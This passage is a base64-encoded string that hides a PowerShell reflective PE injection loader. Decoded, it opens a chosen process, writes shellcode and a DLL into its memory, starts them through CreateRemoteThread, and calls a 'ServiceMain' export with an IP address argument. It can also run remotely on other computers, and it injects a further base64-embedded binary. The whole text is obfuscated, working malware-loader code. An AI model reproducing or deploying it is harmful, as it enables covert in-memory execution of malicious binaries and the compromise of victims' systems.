RoZSBQRSB3YW50cyBtaWdodCBiZSBmcmVlKS4iOw0KCQkJfQ0KCQkJW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkUEVCeXRlcywgMCwgJFBFSGFuZGxlLCAkUEVJbmZvLlNpemVPZkhlYWRlcnMpIHwgT3V0LU51bGw7DQoJCQkkUEVJbmZvID0gR2V0LVBFRGV0YWlsZWRJbmZvIC1QRUhhbmRsZSAkUEVIYW5kbGUgLVdpbjMyVHlwZXMgJFdpbjMyVHlwZXMgLVdpbjMyQ29uc3RhbnRzICRXaW4zMkNvbnN0YW50czsNCgkJCSRQRUluZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBFbmRBZGRyZXNzIC1WYWx1ZSAkUEVFbmRBZGRyZXNzOw0KCQkJJFBFSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIEVmZmVjdGl2ZVBFSGFuZGxlIC1WYWx1ZSAkRWZmZWN0aXZlUEVIYW5kbGU7DQoJCQlDb3B5LVNlY3Rpb25zIC1QRUJ5dGVzICRQRUJ5dGVzIC1QRUluZm8gJFBFSW5mbyAtV2luMzJGdW5jdGlvbnMgJFdpbjMyRnVuY3Rpb25zIC1XaW4zMlR5cGVzICRXaW4zMlR5cGVzOw0KCQkJVXBkYXRlLU1lbW9yeUFkZHJlc3NlcyAtUEVJbmZvICRQRUluZm8gLU9yaWdpbmFsSW1hZ2VCYXNlICRPcmlnaW5hbEltYWdlQmFzZSAtV2luMzJDb25zdGFudHMgJFdpbjMyQ29uc3RhbnRzIC1XaW4zMlR5cGVzICRXaW4zMlR5cGVzOw0KCQkJaWYgKCRSZW1vdGVMb2FkaW5nIC1lcSAkdHJ1ZSkNCgkJCXsNCgkJCQlJbXBvcnQtRGxsSW1wb3J0cyAtUEVJbmZvICRQRUluZm8gLVdpbjMyRnVuY3Rpb25zICRXaW4zMkZ1bmN0aW9ucyAtV2luMzJUeXBlcyAkV2luMzJUeXBlcyAtV2luMzJDb25zdGFudHMgJFdpbjMyQ29uc3RhbnRzIC1SZW1vdGVQcm9jSGFuZGxlICRSZW1vdGVQcm9jSGFuZGxlOw0KCQkJfQ0KCQkJZWxzZQ0KCQkJew0KCQkJCUltcG9ydC1EbGxJbXBvcnRzIC1QRUluZm8gJFBFSW5mbyAtV2luMzJGdW5jdGlvbnMgJFdpbjMyRnVuY3Rpb25zIC1XaW4zMlR5cGVzICRXaW4zMlR5cGVzIC1XaW4zMkNvbnN0YW50cyAkV2luMzJDb25zdGFudHM7DQoJCQl9DQoJCQlpZiAoJFJlbW90ZUxvYWRpbmcgLWVxICRmYWxzZSkNCgkJCXsNCgkJCQlpZiAoJE5YQ29tcGF0aWJsZSAtZXEgJHRydWUpDQoJCQkJew0KCQkJCQlVcGRhdGUtTWVtb3J5UHJvdGVjdGlvbkZsYWdzIC1QRUluZm8gJFBFSW5mbyAtV2luMzJGdW5jdGlvbnMgJFdpbjMyRnVuY3Rpb25zIC1XaW4zMkNvbnN0YW50cyAkV2luMzJDb25zdGFudHMgLVdpbjMyVHlwZXMgJFdpbjMyVHlwZXM7DQoJCQkJfQ0KCQkJCWVsc2UNCgkJCQl7DQoJCQkJfQ0KCQkJfQ0KCQkJZWxzZQ0KCQkJew0KCQkJfQ0KCQkJaWYgKCRSZW1vdGVMb2FkaW5nIC1lcSAkdHJ1ZSkNCgkJCXsNCgkJCQlbVUludDMyXSROdW1CeXRlc1dyaXR0ZW4gPSAwOw0KCQkJCSRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLldyaXRlUHJvY2Vzc01lbW9yeS5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRFZmZlY3RpdmVQRUhhbmRsZSwgJFBFSGFuZGxlLCBbVUludFB0cl0oJFBFSW5mby5TaXplT2ZJbWFnZSksIFtSZWZdJE51bUJ5dGVzV3JpdHRlbik7DQoJCQkJaWYgKCRTdWNjZXNzIC1lcSAkZmFsc2UpDQoJCQkJew0KCQkJCQkkY21kUmVzLlZhbHVlID0gNDY7DQoJCQkJCXRocm93ICJVbmFibGUgdG8gd3JpdGUgc2hlbGxjb2RlIHRvIHJlbW90ZSBwcm9jZXNzIG1lbW9yeS4iOw0KCQkJCX0NCgkJCX0NCgkJCWlmICgkUEVJbmZvLkZpbGVUeXBlIC1pZXEgIkRMTCIpDQoJCQl7DQoJCQkJaWYgKCRSZW1vdGVMb2FkaW5nIC1lcSAkZmFsc2UpDQoJCQkJew0KCQkJCQkkRGxsTWFpblB0ciA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkUEVJbmZvLlBFSGFuZGxlKSAoJFBFSW5mby5JTUFHRV9OVF9IRUFERVJTLk9wdGlvbmFsSGVhZGVyLkFkZHJlc3NPZkVudHJ5UG9pbnQpOw0KCQkJCQkkRGxsTWFpbkRlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbVUludDMyXSwgW0ludFB0cl0pIChbQm9vbF0pOw0KCQkJCQkkRGxsTWFpbiA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCREbGxNYWluUHRyLCAkRGxsTWFpbkRlbGVnYXRlKTsNCgkJCQkJJERsbE1haW4uSW52b2tlKCRQRUluZm8uUEVIYW5kbGUsIDEsIFtJbnRQdHJdOjpaZXJvKSB8IE91dC1OdWxsOw0KCQkJCX0NCgkJCQllbHNlDQoJCQkJew0KCQkJCQkkRGxsTWFpblB0ciA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkRWZmZWN0aXZlUEVIYW5kbGUpICgkUEVJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuQWRkcmVzc09mRW50cnlQb2ludCk7DQoJCQkJCWlmICgkUEVJbmZvLlBFNjRCaXQgLWVxICR0cnVlKQ0KCQkJCQl7DQoJCQkJCQkkQ2FsbERsbE1haW5TQzEgPSBAKDB4NTMsIDB4NDgsIDB4ODksIDB4ZTMsIDB4NjYsIDB4ODMsIDB4ZTQsIDB4MDAsIDB4NDgsIDB4YjkpOw0KCQkJCQkJJENhbGxEbGxNYWluU0MyID0gQCgweGJhLCAweDAxLCAweDAwLCAweDAwLCAweDAwLCAweDQxLCAweGI4LCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDQ4LCAweGI4KTsNCgkJCQkJCSRDYWxsRGxsTWFpblNDMyA9IEAoMHhmZiwgMHhkMCwgMHg0OCwgMHg4OSwgMHhkYywgMHg1YiwgMHhjMyk7DQoJCQkJCX0NCgkJCQkJZWxzZQ0KCQkJCQl7DQoJCQkJCQkkQ2FsbERsbE1haW5TQzEgPSBAKDB4NTMsIDB4ODksIDB4ZTMsIDB4ODMsIDB4ZTQsIDB4ZjAsIDB4YjkpOw0KCQkJCQkJJENhbGxEbGxNYWluU0MyID0gQCgweGJhLCAweDAxLCAweDAwLCAweDAwLCAweDAwLCAweGI4LCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDUwLCAweDUyLCAweDUxLCAweGI4KTsNCgkJCQkJCSRDYWxsRGxsTWFpblNDMyA9IEAoMHhmZiwgMHhkMCwgMHg4OSwgMHhkYywgMHg1YiwgMHhjMyk7DQoJCQkJCX0NCgkJCQkJJFNDTGVuZ3RoID0gJENhbGxEbGxNYWluU0MxLkxlbmd0aCArICRDYWxsRGxsTWFpblNDMi5MZW5ndGggKyAkQ2FsbERsbE1haW5TQzMuTGVuZ3RoICsgKCRQdHJTaXplICogMik7DQoJCQkJCSRTQ1BTTWVtID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKCRTQ0xlbmd0aCk7DQoJCQkJCSRTQ1BTTWVtT3JpZ2luYWwgPSAkU0NQU01lbTsNCgkJCQkJV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJENhbGxEbGxNYWluU0MxIC1NZW1vcnlBZGRyZXNzICRTQ1BTTWVtOw0KCQkJCQkkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkQ2FsbERsbE1haW5TQzEuTGVuZ3RoKTsNCgkJCQkJW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJEVmZmVjdGl2ZVBFSGFuZGxlLCAkU0NQU01lbSwgJGZhbHNlKTsNCgkJCQkJJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJFB0clNpemUpOw0KCQkJCQlXcml0ZS1CeXRlc1RvTWVtb3J5IC1CeXRlcyAkQ2FsbERsbE1haW5TQzIgLU1lbW9yeUFkZHJlc3MgJFNDUFNNZW07DQoJCQkJCSRTQ1BTTWVtID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFNDUFNNZW0gKCRDYWxsRGxsTWFpblNDMi5MZW5ndGgpOw0KCQkJCQlbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkRGxsTWFpblB0ciwgJFNDUFNNZW0sICRmYWxzZSk7DQoJCQkJCSRTQ1BTTWVtID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFNDUFNNZW0gKCRQdHJTaXplKTsNCgkJCQkJV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJENhbGxEbGxNYWluU0MzIC1NZW1vcnlBZGRyZXNzICRTQ1BTTWVtOw0KCQkJCQkkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkQ2FsbERsbE1haW5TQzMuTGVuZ3RoKTsNCgkJCQkJJFJTQ0FkZHIgPSAkV2luMzJGdW5jdGlvbnMuVmlydHVhbEFsbG9jRXguSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCBbSW50UHRyXTo6WmVybywgW1VJbnRQdHJdW1VJbnQ2NF0kU0NMZW5ndGgsICRXaW4zMkNvbnN0YW50cy5NRU1fQ09NTUlUIC1ib3IgJFdpbjMyQ29uc3RhbnRzLk1FTV9SRVNFUlZFLCAkV2luMzJDb25zdGFudHMuUEFHRV9FWEVDVVRFX1JFQURXUklURSk7DQoJCQkJCWlmICgkUlNDQWRkciAtZXEgW0ludFB0cl06Olplcm8pDQoJCQkJCXsNCgkJCQkJCSRjbWRSZXMuVmFsdWUgPSA0NzsNCgkJCQkJCXRocm93ICJVbmFibGUgdG8gYWxsb2NhdGUgbWVtb3J5IGluIHRoZSByZW1vdGUgcHJvY2VzcyBmb3Igc2hlbGxjb2RlIjsNCgkJCQkJfQ0KCQkJCQkkU3VjY2VzcyA9ICRXaW4zMkZ1bmN0aW9ucy5Xcml0ZVByb2Nlc3NNZW1vcnkuSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCAkUlNDQWRkciwgJFNDUFNNZW1PcmlnaW5hbCwgW1VJbnRQdHJdW1VJbnQ2NF0kU0NMZW5ndGgsIFtSZWZdJE51bUJ5dGVzV3JpdHRlbik7DQoJCQkJCWlmICgoJFN1Y2Nlc3MgLWVxICRmYWxzZSkgLW9yIChbVUludDY0XSROdW1CeXRlc1dyaXR0ZW4gLW5lIFtVSW50NjRdJFNDTGVuZ3RoKSkNCgkJCQkJew0KCQkJCQkJJGNtZFJlcy5WYWx1ZSA9IDQ4Ow0KCQkJCQkJdGhyb3cgIlVuYWJsZSB0byB3cml0ZSBzaGVsbGNvZGUgdG8gcmVtb3RlIHByb2Nlc3MgbWVtb3J5LiI7DQoJCQkJCX0NCgkJCQkJJFJUaHJlYWRIYW5kbGUgPSBDcmVhdGUtUmVtb3RlVGhyZWFkIC1Qcm9jZXNzSGFuZGxlICRSZW1vdGVQcm9jSGFuZGxlIC1TdGFydEFkZHJlc3MgJFJTQ0FkZHIgLVdpbjMyRnVuY3Rpb25zICRXaW4zMkZ1bmN0aW9uczsNCgkJCQkJJFJlc3VsdCA9ICRXaW4zMkZ1bmN0aW9ucy5XYWl0Rm9yU2luZ2xlT2JqZWN0Lkludm9rZSgkUlRocmVhZEhhbmRsZSwgMjAwMDApOw0KCQkJCQlpZiAoJFJlc3VsdCAtbmUgMCkNCgkJCQkJew0KCQkJCQkJJGNtZFJlcy5WYWx1ZSA9IDQ5Ow0KCQkJCQkJdGhyb3cgIkNhbGwgdG8gQ3JlYXRlUmVtb3RlVGhyZWFkIHRvIGNhbGwgR2V0UHJvY0FkZHJlc3MgZmFpbGVkLiI7DQoJCQkJCX0NCgkJCQkJJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxGcmVlRXguSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCAkUlNDQWRkciwgW1VJbnRQdHJdW1VJbnQ2NF0wLCAkV2luMzJDb25zdGFudHMuTUVNX1JFTEVBU0UpIHwgT3V0LU51bGw7DQoJCQkJfQ0KCQkJfQ0KCQkJcmV0dXJuIEAoJFBFSW5mby5QRUhhbmRsZSwgJEVmZmVjdGl2ZVBFSGFuZGxlKTsNCgkJfQ0KCQlGdW5jdGlvbiBNYWluDQoJCXsNCgkJCSRXaW4zMkZ1bmN0aW9ucyA9IEdldC1XaW4zMkZ1bmN0aW9uczsNCgkJCSRXaW4zMlR5cGVzID0gR2V0LVdpbjMyVHlwZXM7DQoJCQkkV2luMzJDb25zdGFudHMgPSBHZXQtV2luMzJDb25zdGFudHM7DQoJCQkkUmVtb3RlUHJvY0hhbmRsZSA9IFtJbnRQdHJdOjpaZXJvOw0KCQkJJFBFSGFuZGxlID0gW0ludFB0cl06Olplcm87DQogICAgICAgICAgICBpZiAoKCRQcm9jSWQgLW5lICRudWxsKSAtYW5kICgkUHJvY0lkIC1uZSAwKSAtYW5kICgkUHJvY05hbWUgLW5lICRudWxsKSAtYW5kICgkUHJvY05hbWUgLW5lICIiKSkNCiAgICAJCXsNCiAgICAJCQlUaHJvdyAiQ2FuJ3Qgc3VwcGx5IGEgUHJvY0lkIGFuZCBQcm9jTmFtZSwgY2hvb3NlIG9uZSBvciB0aGUgb3RoZXIiDQogICAgCQl9DQogICAgCQllbHNlaWYgKCRQcm9jTmFtZSAtbmUgJG51bGwgLWFuZCAkUHJvY05hbWUgLW5lICIiKQ0KICAgIAkJew0KICAgIAkJCSRQcm9jZXNzZXMgPSBAKEdldC1Qcm9jZXNzIC1OYW1lICRQcm9jTmFtZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkNCiAgICAJCQlpZiAoJFByb2Nlc3Nlcy5Db3VudCAtZXEgMCkNCiAgICAJCQl7DQogICAgCQkJCVRocm93ICJDYW4ndCBmaW5kIHByb2Nlc3MgJFByb2NOYW1lIg0KICAgIAkJCX0NCiAgICAJCQllbHNlaWYgKCRQcm9jZXNzZXMuQ291bnQgLWd0IDEpDQogICAgCQkJew0KICAgIAkJCQkkUHJvY0luZm8gPSBHZXQtUHJvY2VzcyB8IHdoZXJlIHsgJF8uTmFtZSAtZXEgJFByb2NOYW1lIH0gfCBTZWxlY3QtT2JqZWN0IFByb2Nlc3NOYW1lLCBJZCwgU2Vzc2lvbklkDQogICAgCQkJCVdyaXRlLU91dHB1dCAkUHJvY0luZm8NCiAgICAJCQkJVGhyb3cgIk1vcmUgdGhhbiBvbmUgaW5zdGFuY2Ugb2YgJFByb2NOYW1lIGZvdW5kLCBwbGVhc2Ugc3BlY2lmeSB0aGUgcHJvY2VzcyBJRCB0byBpbmplY3QgaW4gdG8uIg0KICAgIAkJCX0NCiAgICAJCQllbHNlDQogICAgCQkJew0KICAgIAkJCQkkUHJvY0lkID0gJFByb2Nlc3Nlc1swXS5JRA0KICAgIAkJCX0NCiAgICAJCX0NCiAgICAJDQogICAgCQlpZiAoKCRQcm9jSWQgLW5lICRudWxsKSAtYW5kICgkUHJvY0lkIC1uZSAwKSkNCiAgICAJCXsNCiAgICAJCQkkUmVtb3RlUHJvY0hhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5PcGVuUHJvY2Vzcy5JbnZva2UoMHgwMDFGMEZGRiwgJGZhbHNlLCAkUHJvY0lkKQ0KICAgIAkJCWlmICgkUmVtb3RlUHJvY0hhbmRsZSAtZXEgW0ludFB0cl06Olplcm8pDQogICAgCQkJew0KICAgIAkJCQlUaHJvdyAiQ291bGRuJ3Qgb2J0YWluIHRoZSBoYW5kbGUgZm9yIHByb2Nlc3MgSUQ6ICRQcm9jSWQiDQogICAgCQkJfQ0KICAgIAkJCQ0KICAgIAkJCVdyaXRlLVZlcmJvc2UgIkdvdCB0aGUgaGFuZGxlIGZvciB0aGUgcmVtb3RlIHByb2Nlc3MgdG8gaW5qZWN0IGluIHRvIg0KICAgIAkJfQ0KCQkJaWYgKCRSZW1vdGVQcm9jSGFuZGxlIC1lcSBbSW50UHRyXTo6WmVybykNCgkJCXsNCgkJCQkkUEVMb2FkZWRJbmZvID0gSW52b2tlLU1lbW9yeUxvYWRMaWJyYXJ5IC1QRUJ5dGVzICRQRUJ5dGVzIC1FeGVBcmdzICRFeGVBcmdzIC1Gb3JjZUFTTFIgJEZvcmNlQVNMUjsNCgkJCX0NCgkJCWVsc2UNCgkJCXsNCgkJCQkkUEVMb2FkZWRJbmZvID0gSW52b2tlLU1lbW9yeUxvYWRMaWJyYXJ5IC1QRUJ5dGVzICRQRUJ5dGVzIC1FeGVBcmdzICRFeGVBcmdzIC1SZW1vdGVQcm9jSGFuZGxlICRSZW1vdGVQcm9jSGFuZGxlIC1Gb3JjZUFTTFIgJEZvcmNlQVNMUjsNCgkJCX0NCgkJCWlmICgkUEVMb2FkZWRJbmZvIC1lcSBbSW50UHRyXTo6WmVybykNCgkJCXsNCgkJCQkkY21kUmVzLlZhbHVlID0gNTA7DQoJCQkJdGhyb3cgIlVuYWJsZSB0byBsb2FkIFBFLCBoYW5kbGUgcmV0dXJuZWQgaXMgTlVMTCI7DQoJCQl9DQoJCQkkUEVIYW5kbGUgPSAkUEVMb2FkZWRJbmZvWzBdOw0KCQkJJFJlbW90ZVBFSGFuZGxlID0gJFBFTG9hZGVkSW5mb1sxXTsNCgkJCSRQRUluZm8gPSBHZXQtUEVEZXRhaWxlZEluZm8gLVBFSGFuZGxlICRQRUhhbmRsZSAtV2luMzJUeXBlcyAkV2luMzJUeXBlcyAtV2luMzJDb25zdGFudHMgJFdpbjMyQ29uc3RhbnRzOw0KCQkJaWYgKCgkUEVJbmZvLkZpbGVUeXBlIC1pZXEgIkRMTCIpIC1hbmQgKCRSZW1vdGVQcm9jSGFuZGxlIC1lcSBbSW50UHRyXTo6WmVybykpDQoJCQl7DQoJCQkJaWYgKCRGdW5jUmV0dXJuVHlwZSkNCgkJCQl7DQoJCQkJCVtJbnRQdHJdJFZvaWRGdW5jQWRkciA9IEdldC1NZW1vcnlQcm9jQWRkcmVzcyAtUEVIYW5kbGUgJFBFSGFuZGxlIC1GdW5jdGlvbk5hbWUgIlNlcnZpY2VNYWluIjsNCgkJCQkJaWYgKCRWb2lkRnVuY0FkZHIgLWVxIFtJbnRQdHJdOjpaZXJvKQ0KCQkJCQl7DQoJCQkJCQkkY21kUmVzLlZhbHVlID0gNTE7DQoJCQkJCQl0aHJvdyAiQ291bGRuJ3QgZmluZCBWb2lkIGZ1bmN0aW9uIGFkZHJlc3MuIjsNCgkJCQkJfQ0KCQkJCQkkVm9pZEZ1bmNEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgIEAoW1N0cmluZ10pICAoW1ZvaWRdKTsNCgkJCQkJJFZvaWRGdW5jID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFZvaWRGdW5jQWRkciwgJFZvaWRGdW5jRGVsZWdhdGUpOw0KCQkJCQkjJGNtZFJlcy5WYWx1ZSA9IDA7DQoJCQkJCSRWb2lkRnVuYy5JbnZva2UoJHN6SXApOw0KCQkJCQl3aGlsZSgkdHJ1ZSl7U3RhcnQtU2xlZXAgLVNlY29uZHMgMTAwO30NCgkJCQl9DQoJCQl9DQoJCQllbHNlaWYgKCgkUEVJbmZvLkZpbGVUeXBlIC1pZXEgIkRMTCIpIC1hbmQgKCRSZW1vdGVQcm9jSGFuZGxlIC1uZSBbSW50UHRyXTo6WmVybykpDQoJCQl7DQoJCQkJJFZvaWRGdW5jQWRkciA9IEdldC1NZW1vcnlQcm9jQWRkcmVzcyAtUEVIYW5kbGUgJFBFSGFuZGxlIC1GdW5jdGlvbk5hbWUgIlNlcnZpY2VNYWluIjsNCgkJCQlpZiAoKCRWb2lkRnVuY0FkZHIgLWVxICRudWxsKSAtb3IgKCRWb2lkRnVuY0FkZHIgLWVxIFtJbnRQdHJdOjpaZXJvKSkNCgkJCQl7DQoJCQkJCSRjbWRSZXMuVmFsdWUgPSA1MjsNCgkJCQkJdGhyb3cgIlZvaWRGdW5jIGNvdWxkbid0IGJlIGZvdW5kIGluIHRoZSBETEwiOw0KCQkJCX0NCgkJCQkkVm9pZEZ1bmNBZGRyID0gU3ViLVNpZ25lZEludEFzVW5zaWduZWQgJFZvaWRGdW5jQWRkciAkUEVIYW5kbGU7DQoJCQkJJFZvaWRGdW5jQWRkciA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRWb2lkRnVuY0FkZHIgJFJlbW90ZVBFSGFuZGxlOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICRsZW5JcCA9ICRzeklwLkxlbmd0aCArIDE7DQogICAgICAgICAgICAgICAgDQogICAgCQkJJElwUHRyID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxBbGxvY0V4Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgW0ludFB0cl06Olplcm8sIFtVSW50UHRyXVtVSW50NjRdJGxlbklwLCAkV2luMzJDb25zdGFudHMuTUVNX0NPTU1JVCAtYm9yICRXaW4zMkNvbnN0YW50cy5NRU1fUkVTRVJWRSwgJFdpbjMyQ29uc3RhbnRzLlBBR0VfUkVBRFdSSVRFKTsNCiAgICAJCQlpZiAoJElwUHRyIC1lcSBbSW50UHRyXTo6WmVybykNCiAgICAJCQl7DQogICAgCQkJCSRjbWRSZXMuVmFsdWUgPSAxNjsNCiAgICAJCQkJdGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSBtZW1vcnkgaW4gdGhlIHJlbW90ZSBwcm9jZXNzIjsNCiAgICAJCQl9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgIAkJCVtVSW50UHRyXSROdW1CeXRlc1dyaXR0ZW4gPSBbVUludFB0cl06Olplcm87DQogICAgICAgIA0KICAgICAgICAgICAgICAgICRQdHJJUGZyb21TWiA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cmluZ1RvSEdsb2JhbEFuc2koJHN6SXApOw0KICAgIAkJCSRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLldyaXRlUHJvY2Vzc01lbW9yeS5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRJcFB0ciwgJFB0cklQZnJvbVNaLCBbVUludFB0cl1bVUludDY0XSRsZW5JcCwgW1JlZl0kTnVtQnl0ZXNXcml0dGVuKTsNCiAgICAJCQlpZiAoJFN1Y2Nlc3MgLWVxICRmYWxzZSkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICRjbWRSZXMuVmFsdWUgPSAxNjsNCiAgICAJCQkJdGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSBtZW1vcnkgaW4gdGhlIHJlbW90ZSBwcm9jZXNzIjsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICANCgkJCQkkUlRocmVhZEhhbmRsZSA9IENyZWF0ZS1SZW1vdGVUaHJlYWQgLVByb2Nlc3NIYW5kbGUgJFJlbW90ZVByb2NIYW5kbGUgLVN0YXJ0QWRkcmVzcyAkVm9pZEZ1bmNBZGRyIC1Bcmd1bWVudFB0ciAkSXBQdHIgLVdpbjMyRnVuY3Rpb25zICRXaW4zMkZ1bmN0aW9uczsNCgkJCX0NCgkJCWlmICgkUmVtb3RlUHJvY0hhbmRsZSAtZXEgW0ludFB0cl06Olplcm8gLWFuZCAkUEVJbmZvLkZpbGVUeXBlIC1pZXEgIkRMTCIpDQoJCQl7DQoJCQl9DQoJCQllbHNlDQoJCQl7DQoJCQkJJFN1Y2Nlc3MgPSAkV2luMzJGdW5jdGlvbnMuVmlydHVhbEZyZWUuSW52b2tlKCRQRUhhbmRsZSwgW1VJbnQ2NF0wLCAkV2luMzJDb25zdGFudHMuTUVNX1JFTEVBU0UpOw0KCQkJCWlmICgkU3VjY2VzcyAtZXEgJGZhbHNlKQ0KCQkJCXsNCgkJCQkJV3JpdGUtV2FybmluZyAiVW5hYmxlIHRvIGNhbGwgVmlydHVhbEZyZWUgb24gdGhlIFBFJ3MgbWVtb3J5LiBDb250aW51aW5nIGFueXdheXMuIiAtV2FybmluZ0FjdGlvbiBDb250aW51ZTsNCgkJCQl9DQoJCQl9DQoJCX0NCgkJTWFpbjsNCgl9DQoJRnVuY3Rpb24gTWFpbg0KCXsNCgkJaWYgKCgkUFNDbWRsZXQuTXlJbnZvY2F0aW9uLkJvdW5kUGFyYW1ldGVyc1siRGVidWciXSAtbmUgJG51bGwpIC1hbmQgJFBTQ21kbGV0Lk15SW52b2NhdGlvbi5Cb3VuZFBhcmFtZXRlcnNbIkRlYnVnIl0uSXNQcmVzZW50KQ0KCQl7DQoJCQkkRGVidWdQcmVmZXJlbmNlID0gIkNvbnRpbnVlIjsNCgkJfQ0KCQkkZV9tYWdpYyA9ICgkUEVCeXRlc1swIC4uIDFdIHwgJSB7IFtDaGFyXSRfIH0pIC1qb2luICcnOw0KCQlpZiAoJGVfbWFnaWMgLW5lICdNWicpDQoJCXsNCgkJCSRjbWRSZXMuVmFsdWUgPSA1MzsNCgkJCXRocm93ICdQRSBpcyBub3QgYSB2YWxpZCBQRSBmaWxlLic7DQoJCX0NCgkJaWYgKC1ub3QgJERvTm90WmVyb01aKQ0KCQl7DQoJCQkkUEVCeXRlc1swXSA9IDA7DQoJCQkkUEVCeXRlc1sxXSA9IDA7DQoJCX0NCgkJaWYgKCRFeGVBcmdzIC1uZSAkbnVsbCAtYW5kICRFeGVBcmdzIC1uZSAnJykNCgkJew0KCQkJJEV4ZUFyZ3MgPSAiUmVmbGVjdGl2ZUV4ZSAkRXhlQXJncyI7DQoJCX0NCgkJZWxzZQ0KCQl7DQoJCQkkRXhlQXJncyA9ICJSZWZsZWN0aXZlRXhlIjsNCgkJfQ0KCQlpZiAoJENvbXB1dGVyTmFtZSAtZXEgJG51bGwgLW9yICRDb21wdXRlck5hbWUgLWltYXRjaCAiXlxzKiQiKQ0KCQl7DQoJCQlJbnZva2UtQ29tbWFuZCAtU2NyaXB0QmxvY2sgJFJlbW90ZVNjcmlwdEJsb2NrIC1Bcmd1bWVudExpc3QgQCgkUEVCeXRlcywgJEZ1bmNSZXR1cm5UeXBlLCAkUHJvY0lkLCAkUHJvY05hbWUsICRGb3JjZUFTTFIpOw0KCQl9DQoJCWVsc2UNCgkJew0KCQkJSW52b2tlLUNvbW1hbmQgLVNjcmlwdEJsb2NrICRSZW1vdGVTY3JpcHRCbG9jayAtQXJndW1lbnRMaXN0IEAoJFBFQnl0ZXMsICRGdW5jUmV0dXJuVHlwZSwgJFByb2NJZCwgJFByb2NOYW1lLCAkRm9yY2VBU0xSKSAtQ29tcHV0ZXJOYW1lICRDb21wdXRlck5hbWU7DQoJCX0NCgl9DQoJTWFpbjsNCn0NCiRQRUJ5dGVzID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkSW5wdXRTdHJpbmcpOw0KaWYoICRpZFByb2Nlc3MgLWVxIDApDQp7DQoJSW52b2tlLVJlZmxlY3RpdmVQRUluamVjdGlvbiAtUEVCeXRlcyAkUEVCeXRlcyAtRnVuY1JldHVyblR5cGUgVm9pZCAtRm9yY2VBU0xSOw0KfQ0KZWxzZQ0Kew0KCUludm9rZS1SZWZsZWN0aXZlUEVJbmplY3Rpb24gLVBFQnl0ZXMgJFBFQnl0ZXMgLUZ1bmNSZXR1cm5UeXBlIFZvaWQgLUZvcmNlQVNMUiAtUHJvY0lkICRpZFByb2Nlc3M7DQp9DQo=';
